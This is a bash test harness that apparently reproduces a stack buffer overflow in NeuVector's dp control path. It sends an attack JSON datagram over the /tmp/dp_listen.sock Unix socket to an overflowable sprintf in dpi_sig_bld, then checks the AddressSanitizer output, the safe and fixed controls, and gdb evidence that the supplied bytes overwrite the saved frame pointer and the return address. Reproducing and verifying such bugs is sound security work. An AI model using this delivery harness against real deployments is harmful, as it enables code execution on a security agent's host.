#!/usr/bin/env bash
# Live AF_UNIX SOCK_DGRAM replay of the REST-valid W274 message into the
# pinned dp control path: real socket -> real jansson -> verbatim pinned
# dp_ctrl_bld_dlp -> byte-identical real dpi_sig_bld. Not a full dp binary.
set -u
cd "$(dirname "$0")"
pass=0; fail=0
ok()  { echo "PASS $1"; pass=$((pass+1)); }
bad() { echo "FAIL $1"; fail=$((fail+1)); }
has() { grep -Fq -- "$2" "$1" 2>/dev/null; }
hasnt() { ! grep -Fq -- "$2" "$1" 2>/dev/null; }

ROOT=$(readlink -f ../src/real/neuvector-48ae8b5cac5ec3a7e332e5272e9b3050f44396cb)
OUT=$(pwd)/out
SOCK=/tmp/dp_listen.sock
CLIENT=/tmp/dp_client.w280
for f in "$ROOT/dp/ctrl.c" "$OUT/wire-attack.json" "$OUT/wire-safe.json" \
         gen/dp_ctrl_bld_dlp.inc ../realcaller/out/real-vuln-asan.o \
         ../realcaller/out/real-fixed-asan.o; do
    [ -f "$f" ] || { echo "FAIL prerequisite missing: $f (run run.sh first)"; echo "TOTAL: 0 PASS / 1 FAIL"; exit 1; }
done

echo "== provenance =="
sha256sum "$ROOT/dp/ctrl.c" gen/dp_ctrl_bld_dlp.inc loopback.c \
    "$OUT/wire-attack.json" ../realcaller/out/real-vuln-asan.o \
    ../realcaller/out/real-fixed-asan.o
has "$ROOT/dp/ctrl.c" 'DP_SERVER_SOCK "/tmp/dp_listen.sock"' && \
    ok "pinned dp uses /tmp/dp_listen.sock" || bad "pinned dp uses /tmp/dp_listen.sock"
has "$ROOT/dp/ctrl.c" 'size = recvfrom(fd, ctrl_msg_buf, BUF_SIZE - 1' && \
    ok "pinned dp control handler receives a datagram" || bad "pinned dp control handler receives a datagram"
has "$ROOT/dp/ctrl.c" 'ret = dp_ctrl_bld_dlp(msg);' && \
    ok "pinned dp dispatches ctrl_bld_dlp to JSON consumer" || bad "pinned dp dispatches ctrl_bld_dlp to JSON consumer"
has gen/dp_ctrl_bld_dlp.inc 'dpi_sig_bld(&dlpbld, flag);' && \
    ok "verbatim consumer excerpt calls pinned vulnerable function" || bad "verbatim consumer excerpt calls pinned vulnerable function"

echo "== build live consumer with real jansson + pinned ASan objects =="
ROOT_INC="-I$(dirname "$ROOT")/shim -I$ROOT -I$ROOT/dp -include stdio.h -include $ROOT/base.h -include $ROOT/defs.h"
SAN="-g -O0 -fsanitize=address -fno-omit-frame-pointer -fno-stack-protector"
export ASAN_OPTIONS=detect_leaks=0:abort_on_error=0
LIB=/usr/lib/x86_64-linux-gnu/libjansson.so.4
gcc $SAN -Igen -Ijansson $ROOT_INC -c loopback.c -o "$OUT/loopback.o" && \
    ok "live consumer compiles against verbatim pinned excerpt" || { bad "live consumer compiles against verbatim pinned excerpt"; echo "TOTAL: $pass PASS / $((fail+1)) FAIL"; exit 1; }
gcc $SAN -o "$OUT/loopback-vuln" "$OUT/loopback.o" ../realcaller/out/real-vuln-asan.o "$LIB" && \
    ok "link loopback-vuln" || bad "link loopback-vuln"
gcc $SAN -o "$OUT/loopback-fixed" "$OUT/loopback.o" ../realcaller/out/real-fixed-asan.o "$LIB" && \
    ok "link loopback-fixed" || bad "link loopback-fixed"

run_case() {
    local bin="$1" msg="$2" log="$3"
    rm -f "$SOCK" "$CLIENT"
    "$bin" > "$log" 2>&1 &
    local pid=$!
    for _ in $(seq 1 200); do
        grep -Fq 'LOOPBACK READY' "$log" && break
        sleep 0.02
    done
    if ! grep -Fq 'LOOPBACK READY' "$log"; then
        echo "FAIL consumer did not bind $SOCK"
        fail=$((fail+1)); kill "$pid" 2>/dev/null || true; wait "$pid" 2>/dev/null || true
        return 1
    fi
    python3 -c 'import socket,sys; d=open(sys.argv[1],"rb").read(); s=socket.socket(socket.AF_UNIX,socket.SOCK_DGRAM); s.bind(sys.argv[2]); s.sendto(d,sys.argv[3]); print("SENT bytes=%d"%len(d))' \
        "$msg" "$CLIENT" "$SOCK" >> "$log" 2>&1 || true
    wait "$pid" 2>/dev/null || true
    rm -f "$SOCK" "$CLIENT"
    return 0
}

echo "== attack message over the live datagram socket =="
run_case "$OUT/loopback-vuln" "$OUT/wire-attack.json" "$OUT/loopback-attack.log" || true
grep -E 'LOOPBACK|AddressSanitizer|WRITE of size|dpi_sig_bld|dlpsig_buf|SENT' "$OUT/loopback-attack.log" | head -12
has "$OUT/loopback-attack.log" 'LOOPBACK RECV bytes=' && ok "consumer received a real AF_UNIX datagram" || bad "consumer received a real AF_UNIX datagram"
SENT=$(stat -c %s "$OUT/wire-attack.json")
grep -qF "LOOPBACK RECV bytes=$SENT" "$OUT/loopback-attack.log" && \
    ok "received datagram is the exact W274 message ($SENT bytes)" || bad "received datagram is the exact W274 message ($SENT bytes)"
has "$OUT/loopback-attack.log" 'AddressSanitizer: stack-buffer-overflow' && \
    ok "live socket message overflows real dpi_sig_bld" || bad "live socket message overflows real dpi_sig_bld"
has "$OUT/loopback-attack.log" 'WRITE of size 121' && ok "ASan write size is 121 bytes" || bad "ASan write size is 121 bytes"
has "$OUT/loopback-attack.log" 'dpi_sig_bld dp/dpi/sig/dpi_sig.c:658' && \
    ok "overflow write frame is the pinned sprintf" || bad "overflow write frame is the pinned sprintf"
has "$OUT/loopback-attack.log" "'dlpsig_buf' (line 621)" && \
    ok "overflow names the real 2048-byte buffer" || bad "overflow names the real 2048-byte buffer"

echo "== safe / fixed controls over the same socket =="
run_case "$OUT/loopback-vuln" "$OUT/wire-safe.json" "$OUT/loopback-safe.log" || true
run_case "$OUT/loopback-fixed" "$OUT/wire-attack.json" "$OUT/loopback-fixed.log" || true
cat "$OUT/loopback-safe.log" | head -6
cat "$OUT/loopback-fixed.log" | head -6
has "$OUT/loopback-safe.log" 'LOOPBACK rc=0' && ok "safe message completes on live socket (rc=0)" || bad "safe message completes on live socket (rc=0)"
hasnt "$OUT/loopback-safe.log" 'AddressSanitizer' && ok "safe message ASan-clean on live socket" || bad "safe message ASan-clean on live socket"
has "$OUT/loopback-fixed.log" 'LOOPBACK rc=0' && ok "fixed pinned source completes on live socket (rc=0)" || bad "fixed pinned source completes on live socket (rc=0)"
hasnt "$OUT/loopback-fixed.log" 'AddressSanitizer' && ok "fixed pinned source ASan-clean on live socket" || bad "fixed pinned source ASan-clean on live socket"


echo "== optimized real frame over the live socket =="
O2FLAGS="-g -O2 -U_FORTIFY_SOURCE -D_FORTIFY_SOURCE=0 -fno-stack-protector -fno-omit-frame-pointer"
FIXED=$(readlink -f ../src/dpi_sig-fixed.c)
(cd "$ROOT" && gcc $O2FLAGS $ROOT_INC -c dp/dpi/sig/dpi_sig.c -o "$OUT/loopback-real-vuln-o2.o") && \
    (cd "$ROOT" && gcc $O2FLAGS $ROOT_INC -x c -c "$FIXED" -o "$OUT/loopback-real-fixed-o2.o") && \
    gcc $O2FLAGS -Igen -Ijansson $ROOT_INC -c loopback.c -o "$OUT/loopback-o2.o" && \
    gcc $O2FLAGS -o "$OUT/loopback-o2-vuln" "$OUT/loopback-o2.o" "$OUT/loopback-real-vuln-o2.o" "$LIB" && \
    gcc $O2FLAGS -o "$OUT/loopback-o2-fixed" "$OUT/loopback-o2.o" "$OUT/loopback-real-fixed-o2.o" "$LIB" && \
    ok "optimized live consumer and pinned objects build" || { bad "optimized live consumer and pinned objects build"; echo "TOTAL: $pass PASS / $((fail+1)) FAIL"; exit 1; }
run_case "$OUT/loopback-o2-vuln" "$OUT/wire-safe.json" "$OUT/loopback-o2-safe.log" || true
run_case "$OUT/loopback-o2-fixed" "$OUT/wire-attack.json" "$OUT/loopback-o2-fixed.log" || true
has "$OUT/loopback-o2-safe.log" 'LOOPBACK rc=0' && ok "optimized vulnerable object: safe datagram rc=0" || bad "optimized vulnerable object: safe datagram rc=0"
has "$OUT/loopback-o2-fixed.log" 'LOOPBACK rc=0' && ok "optimized fixed object: attack datagram rc=0" || bad "optimized fixed object: attack datagram rc=0"

run_gdb_case() {
    local msg="$1" log="$2"
    rm -f "$SOCK" "$CLIENT"
    gdb -q -batch \
        -ex 'set pagination off' \
        -ex 'break dp/dpi/sig/dpi_sig.c:662' \
        -ex 'run' \
        -ex 'printf "O2 LOOP FRAME BUF=%p RBP=%p DELTA=%ld\n", &dlpsig_buf[0], $rbp, (long)($rbp - &dlpsig_buf[0])' \
        -ex 'printf "O2 LOOP SAVED slot0=%p slot1=%p\n", *(void **)$rbp, *(void **)((char *)$rbp + 8)' \
        --args "$OUT/loopback-o2-vuln" > "$log" 2>&1 &
    local pid=$!
    for _ in $(seq 1 300); do
        grep -Fq 'O2 LOOP SAVED' "$log" && break
        sleep 0.02
    done
    python3 -c 'import socket,sys; d=open(sys.argv[1],"rb").read(); s=socket.socket(socket.AF_UNIX,socket.SOCK_DGRAM); s.bind(sys.argv[2]); s.sendto(d,sys.argv[3]); print("SENT bytes=%d"%len(d))' \
        "$msg" "$CLIENT" "$SOCK" >> "$log" 2>&1 || true
    wait "$pid" 2>/dev/null || true
    rm -f "$SOCK" "$CLIENT"
}
run_gdb_case "$OUT/wire-attack.json" "$OUT/loopback-o2-gdb-a.log"
run_gdb_case "$OUT/wire-B.json" "$OUT/loopback-o2-gdb-B.log"
grep -E 'O2 LOOP FRAME|O2 LOOP SAVED|SENT bytes=' "$OUT/loopback-o2-gdb-a.log" | head -4
grep -E 'O2 LOOP FRAME|O2 LOOP SAVED|SENT bytes=' "$OUT/loopback-o2-gdb-B.log" | head -4
grep -qE 'O2 LOOP FRAME BUF=[^ ]+ RBP=[^ ]+ DELTA=2096' "$OUT/loopback-o2-gdb-a.log" && \
    ok "live socket optimized frame BUF-to-RBP delta 2096" || bad "live socket optimized frame BUF-to-RBP delta 2096"
grep -qE 'O2 LOOP SAVED slot0=0x[0-9a-f]*61[0-9a-f]* slot1=0x[0-9a-f]*61[0-9a-f]*' "$OUT/loopback-o2-gdb-a.log" && \
    ok "live socket 'a' bytes fill saved RBP and return slot" || bad "live socket 'a' bytes fill saved RBP and return slot"
grep -qE 'O2 LOOP SAVED slot0=0x[0-9a-f]*42[0-9a-f]* slot1=0x[0-9a-f]*42[0-9a-f]*' "$OUT/loopback-o2-gdb-B.log" && \
    ok "live socket 'B' bytes replace saved RBP and return slot" || bad "live socket 'B' bytes replace saved RBP and return slot"
! cmp -s <(grep '^O2 LOOP SAVED' "$OUT/loopback-o2-gdb-a.log") <(grep '^O2 LOOP SAVED' "$OUT/loopback-o2-gdb-B.log") && \
    ok "wire pattern controls saved frame words over live socket" || bad "wire pattern controls saved frame words over live socket"
echo "TOTAL: $pass PASS / $fail FAIL"
[ "$fail" -eq 0 ]
